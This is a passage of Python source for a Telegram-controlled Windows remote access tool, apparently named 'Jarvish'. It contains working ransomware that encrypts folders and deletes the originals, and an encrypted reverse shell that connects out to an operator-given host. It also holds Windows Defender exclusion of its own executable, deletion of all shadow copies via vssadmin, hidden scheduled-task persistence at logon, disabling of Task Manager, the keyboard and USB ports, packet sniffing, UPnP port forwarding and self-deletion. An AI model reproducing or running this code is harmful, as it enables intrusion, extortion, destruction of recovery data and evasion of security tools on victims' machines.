    packets = scapy.sniff(timeout=duration)
    logging.info(f"Sniffed {len(packets)} packets.")

    packet_details = [f"Packet {i+1}: {packet.summary()}" for i, packet in enumerate(packets[:30])]
    response = "\n".join(packet_details) or "No packet data to show."

    async def send_sniff_result():
        await bot.send_message(chat_id=chat_id, text=f"Sniffed {len(packets)} packets:\n\n{response}")

    asyncio.run_coroutine_threadsafe(send_sniff_result(), loop)

async def handle_sniff_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        duration = int(context.args[0]) if context.args else 30
        logging.info(f"Received sniff command with duration: {duration} seconds.")
        await update.message.reply_text(f"Sniffing packets for {duration} seconds...")

        # Pass bot and event loop into the thread
        loop = asyncio.get_running_loop()
        thread = threading.Thread(
            target=sniff_packets,
            args=(duration, update.effective_chat.id, context.bot, loop)
        )
        thread.start()

    except Exception as e:
        logging.error(f"Error in handle_sniff_command: {e}")
        await update.message.reply_text(f"Error: {e}")
#--END--




#--RANSOM--
from cryptography.fernet import Fernet

ransom_meta_file = "ransom_meta.json"

# Save password-key pair (multi-support)
def save_ransom_key(password, key):
    data = {}
    if os.path.exists(ransom_meta_file):
        with open(ransom_meta_file, "r") as f:
            data = json.load(f)
    data[password] = key.decode()
    with open(ransom_meta_file, "w") as f:
        json.dump(data, f)

# Load key by password
def load_ransom_key(password):
    if not os.path.exists(ransom_meta_file):
        return None
    with open(ransom_meta_file, "r") as f:
        data = json.load(f)
        return data.get(password, None).encode() if password in data else None

# Encrypt folder
async def handle_ransom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /ransom <folder_path> <unlock_password>")
        return

    path, password = context.args[0], context.args[1]
    if not os.path.exists(path):
        await update.message.reply_text("❌ Path not found.")
        return

    key = Fernet.generate_key()
    cipher = Fernet(key)
    save_ransom_key(password, key)

    def encrypt_files():
        for root, _, files in os.walk(path):
            for file in files:
                try:
                    full_path = os.path.join(root, file)
                    with open(full_path, "rb") as f:
                        data = f.read()
                    encrypted = cipher.encrypt(data)
                    with open(full_path + ".locked", "wb") as f:
                        f.write(encrypted)
                    os.remove(full_path)
                except Exception as e:
                    print(f"Encryption error: {e}")

    await asyncio.to_thread(encrypt_files)
    await update.message.reply_text(f"🔒 Files in `{path}` encrypted. Use /unlockransom <folder_path> <password> to unlock.")

# Decrypt folder
async def handle_unlock_ransom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /unlockransom <folder_path> <password>")
        return

    path, password = context.args[0], context.args[1]
    if not os.path.exists(path):
        await update.message.reply_text("❌ Path not found.")
        return

    key = load_ransom_key(password)
    if not key:
        await update.message.reply_text("❌ Invalid password.")
        return

    cipher = Fernet(key)

    def decrypt_files():
        for root, _, files in os.walk(path):
            for file in files:
                if file.endswith(".locked"):
                    full_path = os.path.join(root, file)
                    try:
                        with open(full_path, "rb") as f:
                            encrypted_data = f.read()
                        decrypted_data = cipher.decrypt(encrypted_data)

                        original_name = full_path[:-7]  # Remove '.locked'

                        with open(original_name, "wb") as f:
                            f.write(decrypted_data)

                        os.remove(full_path)
                        print(f"✅ Decrypted: {original_name}")
                    except Exception as e:
                        print(f"❌ Decryption failed for {file}: {e}")

    await asyncio.to_thread(decrypt_files)
    await update.message.reply_text(f"✅ Files in `{path}` unlocked.")

async def handle_delete_ransom_meta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(ransom_meta_file):
        os.remove(ransom_meta_file)
        await update.message.reply_text("🧨 Ransom key metadata destroyed.")
    else:
        await update.message.reply_text("ℹ️ No ransom metadata found.")

# Add handlers (you may already have `app` and `restricted_handler`)
app.add_handler(CommandHandler("ransom", restricted_handler(handle_ransom)))
app.add_handler(CommandHandler("unlockransom", restricted_handler(handle_unlock_ransom)))
app.add_handler(CommandHandler("deleteransommeta", restricted_handler(handle_delete_ransom_meta)))
# --END--



#--USERS-
async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        result = subprocess.run("net user", shell=True, capture_output=True, text=True)
        await update.message.reply_text(f"🧑 Local Users:\n```\n{result.stdout}```", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error listing users: {e}")
app.add_handler(CommandHandler("listusers", restricted_handler(handle_list_users)))
#--END--






#--DISABLEKEYS--
import keyboard

DISABLED_KEYS = set()
DISABLED_COMBOS = {}

def disable_keys_and_combos(items):
    for item in items:
        if '+' in item:
            # It's a combo
            if item not in DISABLED_COMBOS:
                handler = keyboard.add_hotkey(item, lambda: None, suppress=True)
                DISABLED_COMBOS[item] = handler
        else:
            # It's a single key
            if item not in DISABLED_KEYS:
                keyboard.block_key(item)
                DISABLED_KEYS.add(item)

def enable_keys_and_combos(items):
    for item in items:
        if '+' in item:
            if item in DISABLED_COMBOS:
                keyboard.remove_hotkey(DISABLED_COMBOS[item])
                del DISABLED_COMBOS[item]
        else:
            if item in DISABLED_KEYS:
                keyboard.unblock_key(item)
                DISABLED_KEYS.remove(item)

def reset_all_keys():
    for key in list(DISABLED_KEYS):
        keyboard.unblock_key(key)
    for handler in DISABLED_COMBOS.values():
        keyboard.remove_hotkey(handler)
    DISABLED_KEYS.clear()
    DISABLED_COMBOS.clear()

async def handle_disable_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /disablekeys <key|combo> <...>\nExample: /disablekeys a alt+f4 ctrl+esc")
        return
    await asyncio.to_thread(disable_keys_and_combos, context.args)
    await update.message.reply_text(f"🔒 Disabled: {' | '.join(context.args)}")

async def handle_enable_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /enablekeys <key|combo> <...>")
        return
    await asyncio.to_thread(enable_keys_and_combos, context.args)
    await update.message.reply_text(f"✅ Re-enabled: {' | '.join(context.args)}")

async def handle_reset_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await asyncio.to_thread(reset_all_keys)
    await update.message.reply_text("🔓 All keys and combos have been reset.")


app.add_handler(CommandHandler("disablekeys", restricted_handler(log_command(handle_disable_keys))))
app.add_handler(CommandHandler("enablekeys", restricted_handler(log_command(handle_enable_keys))))
app.add_handler(CommandHandler("resetkeys", restricted_handler(log_command(handle_reset_keys))))

#--END--




#--TASKMNGR--
import winreg
import ctypes

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_task_manager() -> str:
    if not is_admin():
        return "⚠️ This command requires administrator rights."
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "🔒 Task Manager has been disabled."
    except Exception as e:
        return f"❌ Failed to disable Task Manager: {e}"

def enable_task_manager() -> str:
    if not is_admin():
        return "⚠️ This command requires administrator rights. Please run Jarvish as admin."
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
        return "✅ Task Manager has been re-enabled."
    except FileNotFoundError:
        return "ℹ️ Task Manager was not disabled."
    except Exception as e:
        return f"❌ Failed to enable Task Manager: {e}"

async def handle_disable_taskmgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = await asyncio.to_thread(disable_task_manager)
    await update.message.reply_text(result)

async def handle_enable_taskmgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = await asyncio.to_thread(enable_task_manager)
    await update.message.reply_text(result)

app.add_handler(CommandHandler("disabletaskmgr", restricted_handler(log_command(handle_disable_taskmgr))))
app.add_handler(CommandHandler("enabletaskmgr", restricted_handler(log_command(handle_enable_taskmgr))))
#--END--



#--REVERSESHELL--
import socket
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import asyncio

reverse_shell_task = None
reverse_shell_exit_flag = False

def start_reverse_shell(IP, PORT, PASSWORD):
    global reverse_shell_exit_flag
    reverse_shell_exit_flag = False

    def get_aes_cipher(password: str, nonce=None):
        key = SHA256.new(password.encode()).digest()
        if nonce:
            return AES.new(key, AES.MODE_EAX, nonce=nonce)
        else:
            return AES.new(key, AES.MODE_EAX)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((IP, PORT))
    except Exception as e:
        return f"[-] Could not connect: {e}"

    cipher = get_aes_cipher(PASSWORD)
    s.send(cipher.nonce)

    while not reverse_shell_exit_flag:
        try:
            s.settimeout(1.0)  # Non-blocking receive with timeout
            try:
                data = s.recv(4096)
            except socket.timeout:
                continue

            if not data:
                break

            nonce, enc_cmd = data[:16], data[16:]
            cipher = get_aes_cipher(PASSWORD, nonce=nonce)
            cmd = cipher.decrypt(enc_cmd).decode().strip()

            if cmd.lower() == "exit":
                break

            # Run command with timeout so we can interrupt
            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                try:
                    stdout_value, stderr_value = proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout_value, stderr_value = b'', b'[!] Command timed out.\n'
            except Exception as e:
                stdout_value, stderr_value = b'', f'[!] Error: {e}\n'.encode()

            output = stdout_value + stderr_value
            if not output:
                output = b'Command executed, no output.\n'

            cipher = get_aes_cipher(PASSWORD)
            encrypted_output = cipher.encrypt(output)
            s.send(cipher.nonce + encrypted_output)

        except Exception as e:
            break

    s.close()
    return "Reverse shell session ended"



async def handle_reverseshell(update, context):
    global reverse_shell_task

    if len(context.args) < 3:
        await update.message.reply_text("Usage: /reverseshell <IP> <PORT> <PASSWORD> use /exitshell to exit revershell")
        return

    IP = context.args[0]
    try:
        PORT = int(context.args[1])
    except:
        await update.message.reply_text("Port must be a number")
        return
    PASSWORD = context.args[2]

    await update.message.reply_text(f"Starting reverse shell to {IP}:{PORT}...")

    # Run reverse shell in background thread so bot doesn't freeze
    reverse_shell_task = asyncio.create_task(
        asyncio.to_thread(start_reverse_shell, IP, PORT, PASSWORD)
    )

    # Optionally await task or just notify user
    # result = await reverse_shell_task
    # await update.message.reply_text(result)

async def handle_exitshell(update, context):
    global reverse_shell_exit_flag, reverse_shell_task
    if reverse_shell_task is None or reverse_shell_task.done():
        await update.message.reply_text("No active reverse shell session.")
        return

    reverse_shell_exit_flag = True

    # Wait for task to finish cleanly
    await reverse_shell_task
    reverse_shell_task = None

    await update.message.reply_text("Reverse shell session closed successfully.")


app.add_handler(CommandHandler("reverseshell", restricted_handler(log_command(handle_reverseshell))))
app.add_handler(CommandHandler("exitshell", restricted_handler(log_command(handle_exitshell))))

#--END--



#--PORTFORWARD--
import miniupnpc
import asyncio
import socket
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

def is_port_open(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        result = s.connect_ex(('127.0.0.1', port))
        return result == 0

def setup_port_forward(port, description="Jarvish Reverse Shell"):
    try:
        upnp = miniupnpc.UPnP()
        upnp.discoverdelay = 200
        ndevices = upnp.discover()
        if ndevices == 0:
            return False

        upnp.selectigd()
        upnp.externalipaddress()  # just fetch silently

        existing = upnp.getspecificportmapping(port, 'TCP')
        if existing is not None:
            # Port already forwarded
            return True

        upnp.addportmapping(port, 'TCP', upnp.lanaddr, port, description, '')
        return True

    except Exception:
        return False

def remove_port_forward(port):
    try:
        upnp = miniupnpc.UPnP()
        upnp.discoverdelay = 200
        ndevices = upnp.discover()
        if ndevices == 0:
            return False

        upnp.selectigd()
        upnp.deleteportmapping(port, 'TCP')
        return True

    except Exception:
        return False

async def handle_portforward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("⚠️ Usage: /portforward <on/off> <port>")
        return

    action = context.args[0].lower()
    try:
        port = int(context.args[1])
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ Invalid port number. Use 1–65535.")
            return
    except ValueError:
        await update.message.reply_text("❌ Port must be a valid integer.")
        return

    if action == "on":
        if await asyncio.to_thread(is_port_open, port):
            await update.message.reply_text(f"✅ Port {port} is already open on this system.")
            return

        await update.message.reply_text(f"🔄 Port {port} not open. Trying to forward via UPnP...")

        success = await asyncio.to_thread(setup_port_forward, port)
        if success:
            await update.message.reply_text(f"✅ Port {port} forwarded successfully via UPnP.")
        else:
            await update.message.reply_text(f"❌ Failed to forward port {port}. Make sure your router supports UPnP and it is enabled.")

    elif action == "off":
        await update.message.reply_text(f"🔄 Trying to remove port forwarding on port {port}...")
        success = await asyncio.to_thread(remove_port_forward, port)
        if success:
            await update.message.reply_text(f"✅ Port forwarding removed for port {port}.")
        else:
            await update.message.reply_text(f"❌ Failed to remove port forwarding for port {port}.")

    else:
        await update.message.reply_text("❌ Invalid action. Use 'on' to forward or 'off' to remove port forwarding.")

app.add_handler(CommandHandler("portforward", restricted_handler(log_command(handle_portforward))))

#--END--






#--exclusionexe--
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def get_defender_exclusions():
    """Return list of Defender excluded paths or None if error."""
    command = 'powershell -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        return [line.strip() for line in result.stdout.splitlines() if line.strip()]
    else:
        return None

async def handle_exclusionexe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text("❌ Please run the EXE as Administrator to add Defender exclusions!")
            return

        exe_path = sys.executable

        exclusions = get_defender_exclusions()
        if exclusions is None:
            await update.message.reply_text("❌ Failed to retrieve current Defender exclusions.")
            return

        if exe_path in exclusions:
            await update.message.reply_text(f"⚠️ EXE is already excluded from Defender:\n`{exe_path}`", parse_mode="Markdown")
            return

        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{exe_path}\'"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            await update.message.reply_text(f"✅ EXE excluded from Defender:\n`{exe_path}`", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"❌ Error excluding EXE:\n{result.stderr}")

    except Exception as e:
        await update.message.reply_text(f"❌ Exception: {e}")

async def handle_removeexclusion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text("❌ Please run the EXE as Administrator to remove Defender exclusions!")
            return

        exe_path = sys.executable

        exclusions = get_defender_exclusions()
        if exclusions is None:
            await update.message.reply_text("❌ Failed to retrieve current Defender exclusions.")
            return

        if exe_path not in exclusions:
            await update.message.reply_text(f"⚠️ EXE is not in Defender exclusions:\n`{exe_path}`", parse_mode="Markdown")
            return

        command = f'powershell -Command "Remove-MpPreference -ExclusionPath \'{exe_path}\'"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            await update.message.reply_text(f"✅ EXE removed from Defender exclusions:\n`{exe_path}`", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"❌ Error removing exclusion:\n{result.stderr}")

    except Exception as e:
        await update.message.reply_text(f"❌ Exception: {e}")

app.add_handler(CommandHandler("exclusionexe", restricted_handler(log_command(handle_exclusionexe))))
app.add_handler(CommandHandler("removeexclusion", restricted_handler(log_command(handle_removeexclusion))))

#--END--




#--RESTOREPOINT--
async def handle_createrestore(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text(
                "❌ *Administrator access required!*\nPlease run the bot with admin privileges to create a restore point.",
                parse_mode="Markdown"
            )
            return

        # Custom name or default
        name = "Restore Point"
        if context.args:
            name = " ".join(context.args)

        await update.message.reply_text("🔄 Creating a system restore point...")

        ps_script = f'''
        try {{
            Checkpoint-Computer -Description "{name}" -RestorePointType "MODIFY_SETTINGS"
        }} catch {{
            Write-Output $_.Exception.Message
        }}
        '''

        output = run_powershell(ps_script)

        if not output or "Checkpoint-Computer" in output:
            await update.message.reply_text(f"✅ *Restore point created:* `{name}`", parse_mode="Markdown")
        elif "already been created within the past 1440 minutes" in output:
            await update.message.reply_text(
                "⚠️ *Restore Point Not Created:*\nSystem already has a restore point created in the last 24 hours.\n\n"
                "🕒 You can bypass this by modifying the registry value:\n"
                "`HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\SystemRestorePointCreationFrequency`\n\n"
                "_(Value is in minutes, default is 1440)_",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                f"⚠️ *Unknown response while creating restore point:*\n```\n{output}\n```",
                parse_mode="Markdown"
            )

    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred:\n```\n{e}\n```", parse_mode="Markdown")

app.add_handler(CommandHandler("createrestorepoint", restricted_handler(log_command(handle_createrestore))))
#--END--

#--RESTOREPOINT LIST--
async def handle_listrestorepoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text(
                "❌ *Administrator access required!*\nPlease run the bot with admin privileges to list restore points.",
                parse_mode="Markdown"
            )
            return
        
        # Run vssadmin to get shadow copies (restore points)
        completed = subprocess.run(
            ["vssadmin", "list", "shadows"], capture_output=True, text=True
        )
        output = completed.stdout.strip() or completed.stderr.strip()

        if output:
            # Telegram messages have a limit, so truncate if too long
            max_len = 3500
            if len(output) > max_len:
                output = output[:max_len] + "\n\n[Output truncated...]"
            await update.message.reply_text(f"🕑 *Restore Points List:*\n```\n{output}\n```", parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠️ No restore points found or no output returned.")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred:\n```\n{e}\n```", parse_mode="Markdown")

app.add_handler(CommandHandler("listrestorepoints", restricted_handler(log_command(handle_listrestorepoints))))
#--END--

#--RESTOREPOINTDELETE--
async def handle_deleterestorepoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text(
                "❌ *Administrator access required!*\nPlease run the bot with admin privileges to delete restore points.",
                parse_mode="Markdown"
            )
            return
        
        await update.message.reply_text("🧹 Deleting all system restore points...")

        completed = subprocess.run(
            ["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, text=True
        )
        output = completed.stdout.strip() or completed.stderr.strip()

        if "Deleted" in output or output == "":
            await update.message.reply_text("✅ All restore points deleted successfully.")
        else:
            await update.message.reply_text(f"⚠️ Could not delete restore points. Output:\n```\n{output}\n```", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Exception:\n```\n{e}\n```", parse_mode="Markdown")

app.add_handler(CommandHandler("deleterestorepoints", restricted_handler(log_command(handle_deleterestorepoints))))
#--END--



#--DISABLEUSBPORTS--
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_powershell(script: str) -> str:
    completed = subprocess.run(["powershell", "-Command", script], capture_output=True, text=True)
    return completed.stdout.strip() or completed.stderr.strip()

# Disable all USB ports (including mouse/keyboard)
async def handle_disableusb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text("❌ Please run the bot with Administrator privileges to disable USB ports!")
            return

        await update.message.reply_text(
            "⚠️ *WARNING: This will disable ALL USB ports including your mouse/keyboard!*\n"
            "💡 Make sure you have remote access or a system restore point ready.\n\n"
            "🔧 Disabling all USB ports..."
        )

        ps_script = """
        Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR" -Name "Start" -Value 4
        Get-PnpDevice -Class "USB" | Disable-PnpDevice -Confirm:$false
        """

        run_powershell(ps_script)

        await update.message.reply_text("✅ All USB ports have been disabled.\n🔁 Reboot may be required for full effect.")

    except Exception as e:
        await update.message.reply_text(f"❌ Exception: {e}")

# Enable all USB ports
async def handle_enableusb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin():
            await update.message.reply_text("❌ Please run the bot with Administrator privileges to enable USB ports!")
            return

        await update.message.reply_text("🔧 Enabling all USB ports...")

        ps_script = """
        Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR" -Name "Start" -Value 3
        Get-PnpDevice -Class "USB" | Enable-PnpDevice -Confirm:$false
        """

        run_powershell(ps_script)

        await update.message.reply_text("✅ All USB ports have been enabled.\n🔌 Reconnect devices if needed.")

    except Exception as e:
        await update.message.reply_text(f"❌ Exception: {e}")

# Register the commands
app.add_handler(CommandHandler("disableusbports", restricted_handler(log_command(handle_disableusb))))
app.add_handler(CommandHandler("enableusbports", restricted_handler(log_command(handle_enableusb))))
#--END--





#--ABORT--
TASK_NAME = "main"  # Default task name to remove on abort

async def handle_abort(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        exe_path = sys.executable

        if not is_admin():
            await update.message.reply_text("❌ Please run the EXE as Administrator to perform full abort cleanup!")
            return

        # Remove Defender exclusion
        exclusions = get_defender_exclusions()
        if exclusions and exe_path in exclusions:
            cmd_remove_exclusion = f'powershell -Command "Remove-MpPreference -ExclusionPath \'{exe_path}\'"'
            result = subprocess.run(cmd_remove_exclusion, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                await update.message.reply_text(f"✅ Removed Defender exclusion for:\n`{exe_path}`", parse_mode="Markdown")
            else:
                await update.message.reply_text(f"❌ Failed to remove Defender exclusion:\n{result.stderr}")
        else:
            await update.message.reply_text("ℹ️ No Defender exclusion found to remove.")

        # Remove Scheduled Task
        ps_script = f"""
        try {{
            Unregister-ScheduledTask -TaskName '{TASK_NAME}' -Confirm:$false -ErrorAction Stop
            Write-Output 'SUCCESS'
        }} catch {{
            Write-Output 'NOTFOUND'
        }}
        exit
        """
        cmd = [
            "powershell",
            "-WindowStyle", "Hidden",
            "-NoProfile",
            "-Command", ps_script
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

        if "SUCCESS" in result.stdout:
            await update.message.reply_text(f"✅ Scheduled task `{TASK_NAME}` removed successfully.")
        else:
            await update.message.reply_text(f"⚠️ Task `{TASK_NAME}` not found or already removed.")

        # Create bat to delete exe and itself
        bat_path = os.path.join(tempfile.gettempdir(), "deleteme.bat")
        bat_content = f"""@echo off
timeout /t 10 /nobreak > NUL
del "{exe_path}" > NUL 2>&1
del "%~f0" > NUL 2>&1
"""

        with open(bat_path, "w") as bat_file:
            bat_file.write(bat_content)

        subprocess.Popen(
            ['cmd.exe', '/c', bat_path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            close_fds=True
        )

        await update.message.reply_text("🧨 Aborting and deleting Tool in 10 seconds...")
        os._exit(0)

    except Exception as e:
        await update.message.reply_text(f"❌ Error during abort: {e}")

app.add_handler(CommandHandler("abort", restricted_handler(log_command(handle_abort))))
#--END--



#--STARTUP--

import ctypes
import subprocess
import sys
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

TASK_NAME = "main" 

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def create_task_scheduler_task(exe_path: str) -> subprocess.CompletedProcess:
    ps_script = f"""
    $Action = New-ScheduledTaskAction -Execute '{exe_path}';
    $Trigger = New-ScheduledTaskTrigger -AtLogOn;
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest;
    $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal;
    Register-ScheduledTask -TaskName '{TASK_NAME}' -InputObject $Task -Force;
    exit
    """
    cmd = [
        "powershell",
        "-WindowStyle", "Hidden",
        "-NoProfile",
        "-Command", ps_script
    ]
    return subprocess.run(cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

async def handle_addtostartup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        exe_path = sys.executable

        if is_admin():
            result = create_task_scheduler_task(exe_path)
            if result.returncode == 0:
                await update.message.reply_text(f"✅ EXE scheduled to run as Admin at startup with task name `{TASK_NAME}`")
            else:
                await update.message.reply_text(f"❌ Failed to create task.\n\n{result.stderr.strip()}")
        else:
            await update.message.reply_text("❌ Please run the EXE as Administrator to set startup persistence.")

    except Exception as e:
        await update.message.reply_text(f"❌ Exception: {e}")

async def handle_removestartup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ps_script = f"""
        try {{
            Unregister-ScheduledTask -TaskName '{TASK_NAME}' -Confirm:$false -ErrorAction Stop
            Write-Output 'SUCCESS'
        }} catch {{
            Write-Output 'NOTFOUND'
        }}
        exit
        """
        cmd = [
            "powershell",
            "-WindowStyle", "Hidden",
            "-NoProfile",
            "-Command", ps_script
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

        if "SUCCESS" in result.stdout:
            await update.message.reply_text(f"✅ Scheduled task `{TASK_NAME}` removed successfully.")
        else:
            await update.message.reply_text(f"⚠️ Task `{TASK_NAME}` not found or already removed.")

    except Exception as e:
        await update.message.reply_text(f"❌ Exception: {e}")

app.add_handler(CommandHandler("addtostartup", restricted_handler(log_command(handle_addtostartup))))
app.add_handler(CommandHandler("removestartup", restricted_handler(log_command(handle_removestartup))))
#--END--


#--DOWNLOAD--
# -- DOWNLOAD --
import os
import re
import sys
import aiohttp
import asyncio
from urllib.parse import urlparse
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

# Track download tasks per chat
download_tasks = {}

async def download_file(session, url, dest_path):
    async with session.get(url) as response:
        if response.status != 200:
            raise Exception(f"HTTP Error {response.status}")

        cd = response.headers.get("Content-Disposition", "")
        match = re.findall('filename="(.+?)"', cd)
        filename = os.path.basename(dest_path)  # fallback

        if match:
            filename = match[0]

        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
        final_path = os.path.join(os.path.dirname(dest_path), filename)

        with open(final_path, "wb") as f:
            while True:
                chunk = await response.content.read(1024)
                if not chunk:
                    break
                f.write(chunk)

        return final_path

async def handle_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /download <DIRECT_URL>")
        return

    url = context.args[0]
    await update.message.reply_text("📥 Download started in background. You'll be notified once it's done.")

    async def background_download():
        try:
            async with aiohttp.ClientSession() as session:
                default_name = os.path.basename(urlparse(url).path) or "downloaded_file"

                base_path = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.getcwd()
                dest_path = os.path.join(base_path, default_name)
                final_path = await download_file(session, url, dest_path)

                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ Download complete:\n`{os.path.basename(final_path)}`",
                    parse_mode="Markdown"
                )

        except asyncio.CancelledError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Download cancelled.")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Failed to download:\n{e}")
        finally:
            download_tasks.pop(update.effective_chat.id, None)

    task = asyncio.create_task(background_download())
    download_tasks[update.effective_chat.id] = task

async def handle_cancel_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    task = download_tasks.get(update.effective_chat.id)
    if task and not task.done():
        task.cancel()
        await update.message.reply_text("🛑 Cancelling download...")
    else:
        await update.message.reply_text("ℹ️ No active download to cancel.")

app.add_handler(CommandHandler("download", restricted_handler(log_command(handle_download))))
app.add_handler(CommandHandler("canceldownload", restricted_handler(log_command(handle_cancel_download))))
#--END--





#--SOUND--
import tempfile
import asyncio
from telegram import Update, Message
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters, ApplicationBuilder
import os
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "1"
import pygame

# Set of users waiting to send audio after /sound command
waiting_for_audio = set()

async def handle_sound_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    waiting_for_audio.add(user_id)
    await update.message.reply_text(
        "🎵 Send me an audio file (mp3, wav, or mp4 audio) now, I'll play it silently in background."
    )

async def play_audio_file(path: str):
    pygame.mixer.init()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        await asyncio.sleep(0.5)
    pygame.mixer.quit()

async def handle_audio_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in waiting_for_audio:
        # User didn't issue /sound before sending audio, ignore
        return

    message: Message = update.message
    waiting_for_audio.remove(user_id)

    audio = message.audio or message.voice or message.document
    if not audio:
        await message.reply_text("❌ Please send a valid audio file.")
        return

    await message.reply_text("🔊 Playing your audio now in the background...")

    async def play_audio():
        tmp_path = None
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as tmp:
                tmp_path = tmp.name

            # Get the file object asynchronously
            file = await audio.get_file()

            # Correct: await download
            await file.download_to_drive(custom_path=tmp_path)

            # Play audio with pygame
            await play_audio_file(tmp_path)

        except Exception as e:
            await context.bot.send_message(
                chat_id=message.chat_id,
                text=f"❌ Error playing sound: {e}"
            )
        finally:
            if tmp_path and os.path.exists(tmp_path):
                os.remove(tmp_path)

    asyncio.create_task(play_audio())

app.add_handler(CommandHandler("sound", restricted_handler(log_command(handle_sound_command))))
app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE | filters.Document.ALL, handle_audio_message))
#--END--


#--MOVEEXE--
import os
import sys
import ctypes
import shutil
import tempfile
import subprocess
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

async def handle_moveexe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
